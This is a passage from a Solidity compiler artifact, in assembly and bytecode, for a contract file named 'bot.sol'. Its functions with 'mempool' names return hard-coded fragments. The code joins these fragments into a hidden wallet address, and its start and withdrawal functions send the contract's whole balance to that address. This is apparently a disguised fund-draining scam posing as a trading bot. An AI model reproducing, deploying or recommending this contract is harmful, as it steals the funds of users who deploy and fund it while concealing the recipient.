\"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_58)\n    tag_60:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup4\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_61:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_63\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_61)\n    tag_63:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_64:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_66\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_64)\n    tag_66:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap9\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      swap1\n      0x40\n      mstore\n        /* \"contracts/bot.sol\":14990:15165  return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      swap9\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":13794:15173  function fetchMempoolData() internal pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":5613:6561  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r... */\n    tag_15:\n        /* \"contracts/bot.sol\":5680:5702  address _parsedAddress */\n      0x00\n        /* \"contracts/bot.sol\":5715:5731  bytes memory tmp */\n      0x60\n        /* \"contracts/bot.sol\":5740:5742  _a */\n      dup3\n        /* \"contracts/bot.sol\":5715:5743  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5754:5767  uint160 iaddr */\n      0x00\n        /* \"contracts/bot.sol\":5770:5771  0 */\n      dup1\n        /* \"contracts/bot.sol\":5754:5771  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5782:5792  uint160 b1 */\n      0x00\n        /* \"contracts/bot.sol\":5803:5813  uint160 b2 */\n      dup1\n        /* \"contracts/bot.sol\":5829:5835  uint i */\n      0x00\n        /* \"contracts/bot.sol\":5838:5839  2 */\n      0x02\n        /* \"contracts/bot.sol\":5829:5839  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5824:6522  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_68:\n        /* \"contracts/bot.sol\":5845:5855  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/bot.sol\":5841:5842  i */\n      dup2\n        /* \"contracts/bot.sol\":5841:5855  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/bot.sol\":5824:6522  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_69\n      jumpi\n        /* \"contracts/bot.sol\":5889:5892  256 */\n      0x0100\n        /* \"contracts/bot.sol\":5880:5892  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"contracts/bot.sol\":5926:5929  tmp */\n      dup5\n        /* \"contracts/bot.sol\":5930:5931  i */\n      dup2\n        /* \"contracts/bot.sol\":5926:5932  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_71\n      jumpi\n      invalid\n    tag_71:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":5920:5933  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":5912:5934  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":5907:5934  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":5968:5971  tmp */\n      dup5\n        /* \"contracts/bot.sol\":5976:5977  1 */\n      0x01\n        /* \"contracts/bot.sol\":5972:5973  i */\n      dup3\n        /* \"contracts/bot.sol\":5972:5977  i + 1 */\n      add\n        /* \"contracts/bot.sol\":5968:5978  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_72\n      jumpi\n      invalid\n    tag_72:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":5962:5979  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":5954:5980  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":5949:5980  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6006:6008  97 */\n      0x61\n        /* \"contracts/bot.sol\":6000:6002  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6000:6008  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":5999:6024  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_73\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6020:6023  102 */\n      0x66\n        /* \"contracts/bot.sol\":6014:6016  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6014:6023  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":5999:6024  (b1 >= 97) && (b1 <= 102) */\n    tag_73:\n        /* \"contracts/bot.sol\":5995:6227  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_74\n      jumpi\n        /* \"contracts/bot.sol\":6051:6053  87 */\n      0x57\n        /* \"contracts/bot.sol\":6045:6053  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":5995:6227  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_75)\n    tag_74:\n        /* \"contracts/bot.sol\":6086:6088  65 */\n      0x41\n        /* \"contracts/bot.sol\":6080:6082  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6080:6088  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6079:6103  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_76\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6100:6102  70 */\n      0x46\n        /* \"contracts/bot.sol\":6094:6096  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6094:6102  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6079:6103  (b1 >= 65) && (b1 <= 70) */\n    tag_76:\n        /* \"contracts/bot.sol\":6075:6227  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_77\n      jumpi\n        /* \"contracts/bot.sol\":6130:6132  55 */\n      0x37\n        /* \"contracts/bot.sol\":6124:6132  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":6075:6227  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_78)\n    tag_77:\n        /* \"contracts/bot.sol\":6165:6167  48 */\n      0x30\n        /* \"contracts/bot.sol\":6159:6161  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6159:6167  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6158:6182  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_79\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6179:6181  57 */\n      0x39\n        /* \"contracts/bot.sol\":6173:6175  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6173:6181  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6158:6182  (b1 >= 48) && (b1 <= 57) */\n    tag_79:\n        /* \"contracts/bot.sol\":6154:6227  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_80\n      jumpi\n        /* \"contracts/bot.sol\":6209:6211  48 */\n      0x30\n        /* \"contracts/bot.sol\":6203:6211  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":6154:6227  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_80:\n        /* \"contracts/bot.sol\":6075:6227  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_78:\n        /* \"contracts/bot.sol\":5995:6227  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_75:\n        /* \"contracts/bot.sol\":6252:6254  97 */\n      0x61\n        /* \"contracts/bot.sol\":6246:6248  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6246:6254  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6245:6270  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_81\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6266:6269  102 */\n      0x66\n        /* \"contracts/bot.sol\":6260:6262  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6260:6269  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6245:6270  (b2 >= 97) && (b2 <= 102) */\n    tag_81:\n        /* \"contracts/bot.sol\":6241:6473  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_82\n      jumpi\n        /* \"contracts/bot.sol\":6297:6299  87 */\n      0x57\n        /* \"contracts/bot.sol\":6291:6299  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6241:6473  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_83)\n    tag_82:\n        /* \"contracts/bot.sol\":6332:6334  65 */\n      0x41\n        /* \"contracts/bot.sol\":6326:6328  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6326:6334  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6325:6349  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_84\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6346:6348  70 */\n      0x46\n        /* \"contracts/bot.sol\":6340:6342  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6340:6348  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6325:6349  (b2 >= 65) && (b2 <= 70) */\n    tag_84:\n        /* \"contracts/bot.sol\":6321:6473  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_85\n      jumpi\n        /* \"contracts/bot.sol\":6376:6378  55 */\n      0x37\n        /* \"contracts/bot.sol\":6370:6378  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6321:6473  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_86)\n    tag_85:\n        /* \"contracts/bot.sol\":6411:6413  48 */\n      0x30\n        /* \"contracts/bot.sol\":6405:6407  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6405:6413  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6404:6428  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_87\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6425:6427  57 */\n      0x39\n        /* \"contracts/bot.sol\":6419:6421  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6419:6427  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6404:6428  (b2 >= 48) && (b2 <= 57) */\n    tag_87:\n        /* \"contracts/bot.sol\":6400:6473  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_88\n      jumpi\n        /* \"contracts/bot.sol\":6455:6457  48 */\n      0x30\n        /* \"contracts/bot.sol\":6449:6457  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6400:6473  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_88:\n        /* \"contracts/bot.sol\":6321:6473  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_86:\n        /* \"contracts/bot.sol\":6241:6473  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_83:\n        /* \"contracts/bot.sol\":6507:6509  b2 */\n      dup2\n        /* \"contracts/bot.sol\":6502:6504  16 */\n      0x10\n        /* \"contracts/bot.sol\":6497:6499  b1 */\n      dup5\n        /* \"contracts/bot.sol\":6497:6504  b1 * 16 */\n      mul\n        /* \"contracts/bot.sol\":6497:6509  b1 * 16 + b2 */\n      add\n        /* \"contracts/bot.sol\":6487:6510  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":5862:5863  2 */\n      0x02\n        /* \"contracts/bot.sol\":5857:5863  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5824:6522  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_68)\n    tag_69:\n      pop\n        /* \"contracts/bot.sol\":6547:6552  iaddr */\n      dup3\n        /* \"contracts/bot.sol\":6532:6553  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":5613:6561  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":12139:12230  function getBa() private view returns(uint) {\r... */\n    tag_17:\n        /* \"contracts/bot.sol\":12177:12181  uint */\n      0x00\n        /* \"contracts/bot.sol\":12201:12222  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":12194:12222  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":12139:12230  function getBa() private view returns(uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":10049:10146  function getMempoolShort() private pure returns (string memory) {\r... */\n    tag_28:\n        /* \"contracts/bot.sol\":10098:10111  string memory */\n      0x60\n        /* \"contracts/bot.sol\":10124:10138  return \"0x224\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x3078323234000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10049:10146  function getMempoolShort() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9428:9528  function fetchMempoolEdition() private pure returns (string memory) {\r... */\n    tag_30:\n        /* \"contracts/bot.sol\":9481:9494  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9507:9520  return \"441D\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3434314400000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9428:9528  function fetchMempoolEdition() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16774:16879  function fetchMempoolVersion() private pure returns (string memory) {\r... */\n    tag_32:\n        /* \"contracts/bot.sol\":16827:16840  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16853:16868  return \"a40AFA\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      0x6134304146410000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16774:16879  function fetchMempoolVersion() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15555:15651  function getMempoolLong() private pure returns (string memory) {\r... */\n    tag_34:\n        /* \"contracts/bot.sol\":15603:15616  string memory */\n      0x60\n        /* \"contracts/bot.sol\":15629:15643  return \"dF407\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x6446343037000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15555:15651  function getMempoolLong() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":10809:10907  function getMempoolHeight() private pure returns (string memory) {\r... */\n    tag_36:\n        /* \"contracts/bot.sol\":10859:10872  string memory */\n      0x60\n        /* \"contracts/bot.sol\":10885:10899  return \"39363\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x3339333633000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10809:10907  function getMempoolHeight() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16176:16272  function getMempoolCode() private pure returns (string memory) {\r... */\n    tag_38:\n        /* \"contracts/bot.sol\":16224:16237  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16250:16264  return \"7aC9D\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x3761433944000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16176:16272  function getMempoolCode() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8466:8563  function getMempoolStart() private pure returns (string memory) {\r... */\n    tag_40:\n        /* \"contracts/bot.sol\":8515:8528  string memory */\n      0x60\n        /* \"contracts/bot.sol\":8541:8554  return \"b0D6\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x6230443600000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8466:8563  function getMempoolStart() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":11880:11978  function getMempoolLog() private pure returns (string memory) {\r... */\n    tag_42:\n        /* \"contracts/bot.sol\":11927:11940  string memory */\n      0x60\n        /* \"contracts/bot.sol\":11953:11970  return \"40d5D6ba\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x08\n      dup2\n      mstore\n      0x20\n      add\n      0x3430643544366261000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":11880:11978  function getMempoolLog() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205af42cf13ed92065eeff0311ae02924793f16ed52cc66fe1453c24a6163f457d64736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040526040518060200160405280600081525060019080519060200190610029929190610062565b50604051806020016040528060008152506002908051906020019061004f929190610062565b5034801561005c57600080fd5b50610107565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a357805160ff19168380011785556100d1565b828001600101855582156100d1579182015b828111156100d05782518255916020019190600101906100b5565b5b5090506100de91906100e2565b5090565b61010491905b808211156101005760008160009055506001016100e8565b5090565b90565b6108c0806101166000396000f3fe60806040526004361061002d5760003560e01c8063be9a655514610039578063d4e932921461004357610034565b3661003457005b600080fd5b61004161004d565b005b61004b6100b8565b005b600061005f61005a610123565b610441565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc61008861069a565b9081150290604051600060405180830381858888f193505050501580156100b3573d6000803e3d6000fd5b505050565b60006100ca6100c5610123565b610441565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc6100f361069a565b9081150290604051600060405180830381858888f1935050505015801561011e573d6000803e3d6000fd5b505050565b60608061012e6106a2565b9050606061013a6106df565b9050606061014661071c565b90506060610152610759565b9050606061015e610796565b9050606061016a6107d3565b90506060610176610810565b9050606061018261084d565b905087878787878787876040516020018089805190602001908083835b602083106101c2578051825260208201915060208101905060208303925061019f565b6001836020036101000a03801982511681845116808217855250505050505090500188805190602001908083835b6020831061021357805182526020820191506020810190506020830392506101f0565b6001836020036101000a03801982511681845116808217855250505050505090500187805190602001908083835b602083106102645780518252602082019150602081019050602083039250610241565b6001836020036101000a03801982511681845116808217855250505050505090500186805190602001908083835b602083106102b55780518252602082019150602081019050602083039250610292565b6001836020036101000a03801982511681845116808217855250505050505090500185805190602001908083835b6020831061030657805182526020820191506020810190506020830392506102e3565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b602083106103575780518252602082019150602081019050602083039250610334565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b602083106103a85780518252602082019150602081019050602083039250610385565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b602083106103f957805182526020820191506020810190506020830392506103d6565b6001836020036101000a038019825116818451168082178552505050505050905001985050505050505050506040516020818303038152906040529850505050505050505090565b6000606082905060008090506000806000600290505b602a81101561068d576101008402935084818151811061047357fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061049557fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff16101580156104e6575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156104f657605783039250610590565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610534575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156105445760378303925061058f565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610582575060398373ffffffffffffffffffffffffffffffffffffffff1611155b1561058e576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156105ce575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156105de57605782039150610678565b60418273ffffffffffffffffffffffffffffffffffffffff161015801561061c575060468273ffffffffffffffffffffffffffffffffffffffff1611155b1561062c57603782039150610677565b60308273ffffffffffffffffffffffffffffffffffffffff161015801561066a575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610676576030820391505b5b5b81601084020184019350600281019050610457565b5082945050505050919050565b600047905090565b60606040518060400160405280